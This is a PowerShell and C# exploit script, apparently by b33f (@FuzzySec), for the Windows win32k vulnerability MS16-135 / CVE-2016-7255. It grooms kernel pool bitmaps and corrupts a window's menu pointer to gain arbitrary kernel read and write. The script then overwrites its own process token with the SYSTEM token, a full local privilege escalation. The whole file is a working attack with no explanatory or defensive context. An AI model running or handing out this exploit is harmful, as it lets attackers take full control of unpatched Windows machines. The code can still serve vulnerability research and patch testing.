Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

[StructLayout(LayoutKind.Sequential)]
public struct INPUT
{
	public int itype;
	public KEYBDINPUT U;
	public int Size;
}

[StructLayout(LayoutKind.Sequential)]
public struct KEYBDINPUT
{
	public UInt16 wVk;
	public UInt16 wScan;
	public uint dwFlags;
	public int time;
	public IntPtr dwExtraInfo;
}

[StructLayout(LayoutKind.Sequential)] 
public struct tagMSG  
{  
    public IntPtr hwnd;
    public UInt32 message;
    public UIntPtr wParam;
    public UIntPtr lParam;
    public UInt32 time;
    public POINT pt;
}

public struct POINT
{  
    public Int32 x;
    public Int32 Y;
}

public class ms16135
{
	delegate IntPtr WndProc(
		IntPtr hWnd,
		uint msg,
		IntPtr wParam,
		IntPtr lParam);

	[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
	struct WNDCLASSEX
	{
		public uint cbSize;
		public uint style;
		public IntPtr lpfnWndProc;
		public int cbClsExtra;
		public int cbWndExtra;
		public IntPtr hInstance;
		public IntPtr hIcon;
		public IntPtr hCursor;
		public IntPtr hbrBackground;
		[MarshalAs(UnmanagedType.LPWStr)]
		public string lpszMenuName;
		[MarshalAs(UnmanagedType.LPWStr)]
		public string lpszClassName;
		public IntPtr hIconSm;
	}
	
	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	static extern System.UInt16 RegisterClassW(
		[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);

	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr CreateWindowExW(
		UInt32 dwExStyle,
		[MarshalAs(UnmanagedType.LPWStr)]
		string lpClassName,
		[MarshalAs(UnmanagedType.LPWStr)]
		string lpWindowName,
		UInt32 dwStyle,
		Int32 x,
		Int32 y,
		Int32 nWidth,
		Int32 nHeight,
		IntPtr hWndParent,
		IntPtr hMenu,
		IntPtr hInstance,
		IntPtr lpParam);

	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	static extern System.IntPtr DefWindowProcW(
		IntPtr hWnd,
		uint msg,
		IntPtr wParam,
		IntPtr lParam);

	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	public static extern bool DestroyWindow(
		IntPtr hWnd);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool UnregisterClass(
		String lpClassName,
		IntPtr hInstance);

	[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetModuleHandleW(
		[MarshalAs(UnmanagedType.LPWStr)]
		String lpModuleName);

	[DllImport("user32.dll", EntryPoint="SetWindowLongPtr")]
	public static extern IntPtr SetWindowLongPtr(
		IntPtr hWnd,
		int nIndex,
		IntPtr dwNewLong);

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(
		IntPtr hWnd,
		int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SetParent(
		IntPtr hWndChild,
		IntPtr hWndNewParent);

	[DllImport("user32.dll", SetLastError = false)]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(
		IntPtr hWnd);

	[DllImport("user32.dll", SetLastError=true)]
	public static extern void SwitchToThisWindow(
		IntPtr hWnd,
		bool fAltTab);

	[DllImport("user32.dll")]
	public static extern bool GetMessage(
		out tagMSG lpMsg,
		IntPtr hWnd,
		uint wMsgFilterMin,
		uint wMsgFilterMax);

	[DllImport("user32.dll")]
	public static extern bool TranslateMessage(
		[In] ref tagMSG lpMsg);

	[DllImport("user32.dll")]
	public static extern IntPtr DispatchMessage(
		[In] ref tagMSG lpmsg);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SetFocus(
		IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern uint SendInput(
		uint nInputs, 
		[In] INPUT pInputs, 
		int cbSize);

	[DllImport("gdi32.dll")]
	public static extern int GetBitmapBits(
		IntPtr hbmp,
		int cbBuffer,
		IntPtr lpvBits);

	[DllImport("gdi32.dll")]
	public static extern int SetBitmapBits(
		IntPtr hbmp,
		int cbBytes,
		IntPtr lpBits);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

	public UInt16 CustomClass(string class_name)
	{
		m_wnd_proc_delegate = CustomWndProc;
		WNDCLASSEX wind_class = new WNDCLASSEX();
		wind_class.lpszClassName = class_name;
		///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class);
		wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
		return RegisterClassW(ref wind_class);
	}

	private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
	{
		return DefWindowProcW(hWnd, msg, wParam, lParam);
	}

	private WndProc m_wnd_proc_delegate;
}
"@


	$ms16135 = @"
	 _____ _____ ___   ___     ___   ___ ___ 
	|     |   __|_  | |  _|___|_  | |_  |  _|
	| | | |__   |_| |_| . |___|_| |_|_  |_  |
	|_|_|_|_____|_____|___|   |_____|___|___|
										
	                   [by b33f -> @FuzzySec]
					   
"@
$ms16135



if ([System.IntPtr]::Size -ne 8) {
	echo "`n[!] Target architecture is x64 only!`n"
	Return
}


$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
	'10.0' 
	{
		echo "[?] Target is Win 10"
		echo "[+] Bitmap dimensions: 0x760*0x4`n"
	}

	'6.3' 
	{
		echo "[?] Target is Win 8.1"
		echo "[+] Bitmap dimensions: 0x760*0x4`n"
	}

	'6.2' 
	{
		echo "[?] Target is Win 8"
		echo "[+] Bitmap dimensions: 0x760*0x4`n"
	}

	'6.1' 
	{
		echo "[?] Target is Win 7"
		echo "[+] Bitmap dimensions: 0x770*0x4`n"
	}
}


function Get-LoadedModules {


	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct SYSTEM_MODULE_INFORMATION
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public UIntPtr[] Reserved;
		public IntPtr ImageBase;
		public UInt32 ImageSize;
		public UInt32 Flags;
		public UInt16 LoadOrderIndex;
		public UInt16 InitOrderIndex;
		public UInt16 LoadCount;
		public UInt16 ModuleNameOffset;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		internal Char[] _ImageName;
		public String ImageName {
			get {
				return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
			}
		}
	}

	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			IntPtr SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
	}
"@

	[int]$BuffPtr_Size = 0
	while ($true) {
		[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
		$SystemInformationLength = New-Object Int
	
		
		$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
		
		
		if ($CallResult -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
		}
		
		elseif ($CallResult -eq 0x00000000) {
			break
		}
		
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			return
		}
	}

	$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
	$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		$SYSTEM_MODULE_INFORMATION_Size = 284
	} else {
		$SYSTEM_MODULE_INFORMATION_Size = 296
	}

	$BuffOffset = $BuffPtr.ToInt64()
	$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
	$BuffOffset = $BuffOffset + [System.IntPtr]::Size

	$SystemModuleArray = @()
	for ($i=0; $i -lt $HandleCount; $i++){
		$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
		$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
		
		$HashTable = @{
			ImageName = $Cast.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
			ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
		}
		
		$Object = New-Object PSObject -Property $HashTable
		$SystemModuleArray += $Object
	
		$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
	}

	$SystemModuleArray

	
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}

function Stage-gSharedInfoBitmap {


	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	public static class gSharedInfoBitmap
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
		    int nWidth,
		    int nHeight,
		    uint cPlanes,
		    uint cBitsPerPel,
		    IntPtr lpvBits);

		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
		    string lpFileName);
		
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
		    IntPtr hModule,
		    string procName);

		[DllImport("user32.dll")]
		public static extern IntPtr CreateAcceleratorTable(
		    IntPtr lpaccl,
		    int cEntries);

		[DllImport("user32.dll")]
		public static extern bool DestroyAcceleratorTable(
		    IntPtr hAccel);
	}
"@

	
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) 
	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
	    if ($x32){
	        $gSharedInfo = $gSharedInfo.ToInt32()
	    } else {
	        $gSharedInfo = $gSharedInfo.ToInt64()
	    }
	    $aheList = $gSharedInfo + [System.IntPtr]::Size
	    if ($x32){
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc 
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
	    } else {
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
	    }

	    $Result = @()
	    $HashTable = @{
	        Handle = $AccelHandle
	        KernelObj = $phead
	    }
	    $Object = New-Object PSObject -Property $HashTable
	    $Result += $Object
	    $Result
	}

	function Destroy-AcceleratorTable {
	    param ($Hanlde)
	    $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
	    $KernelArray += Create-AcceleratorTable
	    if ($KernelArray.Length -gt 1) {
	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				if ($OSMajorMinor -eq "6.1") { 
					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) 
				} else {
					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) 
				}
	            break
	        }
	    }
	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
	    BitmapHandle = $BitmapHandle
	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}

function Bitmap-Elevate {
	param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
"@

	
	function Bitmap-Read {
		param ($Address)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}

	switch ($OSMajorMinor)
	{
		'10.0' 
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' 
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}
	
	
	echo "`n[>] Leaking SYSTEM _EPROCESS.."
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
	echo "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
	echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
	echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	
	echo "`n[>] Leaking current _EPROCESS.."
	echo "[+] Traversing ActiveProcessLinks list"
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
			echo "[+] PID: $NextPID"
			echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	
	echo "`n[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}



function Sim-KeyDown {
	param([Int]$wKey)
	$KeyboardInput = New-Object KEYBDINPUT
	$KeyboardInput.dwFlags = 0
	$KeyboardInput.wVk = $wKey

	$InputObject = New-Object INPUT
	$InputObject.itype = 1
	$InputObject.U = $KeyboardInput
	$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
	
	$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
	if ($CallResult -eq 1) {
		$true
	} else {
		$false
	}
}

function Sim-KeyUp {
	param([Int]$wKey)
	$KeyboardInput = New-Object KEYBDINPUT
	$KeyboardInput.dwFlags = 2
	$KeyboardInput.wVk = $wKey
	
	$InputObject = New-Object INPUT
	$InputObject.itype = 1
	$InputObject.U = $KeyboardInput
	$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
	
	$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
	if ($CallResult -eq 1) {
		$true
	} else {
		$false
	}
}

function Do-AltShiftEsc {
	$CallResult = Sim-KeyDown -wKey 0x12 
	$CallResult = Sim-KeyDown -wKey 0x10 
	$CallResult = Sim-KeyDown -wKey 0x1b 
	$CallResult = Sim-KeyUp -wKey 0x1b   
	$CallResult = Sim-KeyDown -wKey 0x1b 
	$CallResult = Sim-KeyUp -wKey 0x1b   
	$CallResult = Sim-KeyUp -wKey 0x12   
	$CallResult = Sim-KeyUp -wKey 0x10   
}

function Do-AltShiftTab {
	param([Int]$Count)
	$CallResult = Sim-KeyDown -wKey 0x12    
	$CallResult = Sim-KeyDown -wKey 0x10    
	for ($i=0;$i -lt $count;$i++) {
		$CallResult = Sim-KeyDown -wKey 0x9 
		$CallResult = Sim-KeyUp -wKey 0x9   
	}
	$CallResult = Sim-KeyUp -wKey 0x12      
	$CallResult = Sim-KeyUp -wKey 0x10      
}


do {
	$Bitmap1 = Stage-gSharedInfoBitmap
	$Bitmap2 = Stage-gSharedInfoBitmap
	if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) {
		$WorkerBitmap = $Bitmap1
		$ManagerBitmap = $Bitmap2
	} else {
		$WorkerBitmap = $Bitmap2
		$ManagerBitmap = $Bitmap1
	}
	$Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj
} while ($Distance -ne 0x2000)

echo "[?] Adjacent large session pool feng shui.."
echo "[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)"
echo "[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)"
echo "[+] Distance: 0x$('{0:X}' -f $Distance)"


$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63


function Do-OrAddress {
	param([Int64]$Address)

	
	$AtomCreate = New-Object ms16135
	$hAtom = $AtomCreate.CustomClass("cve-2016-7255")
	if ($hAtom -eq 0){
		break
	}

	echo "`n[?] Creating Window objects"
	$hMod = [ms16135]::GetModuleHandleW([String]::Empty)
	
	$hWndParent = [ms16135]::CreateWindowExW(0,"cve-2016-7255",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
	if ($hWndParent -eq 0){
		break
	}

	
	$hWndChild = [ms16135]::CreateWindowExW(0,"cve-2016-7255","cve-2016-7255",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
	if ($hWndChild -eq 0){
		break
	}

	
	$Address = $Address - 0x28

	echo "[+] Corrupting child window spmenu"
	
	$CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address)

	
	$CallResult = [ms16135]::ShowWindow($hWndParent,1)
	$hDesktopWindow = [ms16135]::GetDesktopWindow()
	$CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow)
	$CallResult = [ms16135]::SetForegroundWindow($hWndChild)

	Do-AltShiftTab -Count 4

	$CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true)

	Do-AltShiftEsc

	
	
	
	
	
	function Trigger-Write {
		$SafeGuard = [diagnostics.stopwatch]::StartNew()
		while ($SafeGuard.ElapsedMilliseconds -lt 3000) {
			$tagMSG = New-Object tagMSG
			if ($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) {
				$CallResult = [ms16135]::SetFocus($hWndParent) 
				for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
				$CallResult = [ms16135]::SetFocus($hWndChild)  
				for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
				$CallResult = [ms16135]::TranslateMessage([ref]$tagMSG)
				$CallResult = [ms16135]::DispatchMessage([ref]$tagMSG)
			}
		} $SafeGuard.Stop()
	}
	[IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40)
	do {
		echo "[+] Trying to trigger arbitrary 'Or'.."
		$ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)
		Trigger-Write
		$LoopCount += 1
	} while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10)

	
	$CallResult = [ms16135]::DestroyWindow($hWndChild)
	$CallResult = [ms16135]::DestroyWindow($hWndParent)
	$CallResult = [ms16135]::UnregisterClass("cve-2016-7255",[IntPtr]::Zero)
	
	
	if ($LoopCount -eq 10) {
		echo "`n[!] Bug did not trigger, try again or patched?`n"
		$Script:BugNotTriggered = 1
	}
}

Do-OrAddress -Address $TargetAddress
if ($BugNotTriggered) {
	Return
}



if ($OSMajorMinor -eq "6.1") {
	$SizeVal = 0x400000770
} else {
	$SizeVal = 0x400000760
}
do {
	$Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount)
	if ($Read64 -eq $SizeVal) {
		$Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16)
		$Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24)
		if ($Pointer1 -eq $Pointer2) {
			$BufferOffset = $LoopCount + 16
			Break
		}
	}
	$LoopCount += 8
} while ($LoopCount -lt 0x2000)
$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)
$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)


if ($pvScan0 -ne 0) {
	echo "`n[?] Success, reading beyond worker bitmap size!"
	echo "[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
} else {
	echo "`n[!] Buffer contains invalid data, quitting..`n"
	Return
}


[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)
[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)
$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)
echo "[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"


$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)


Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle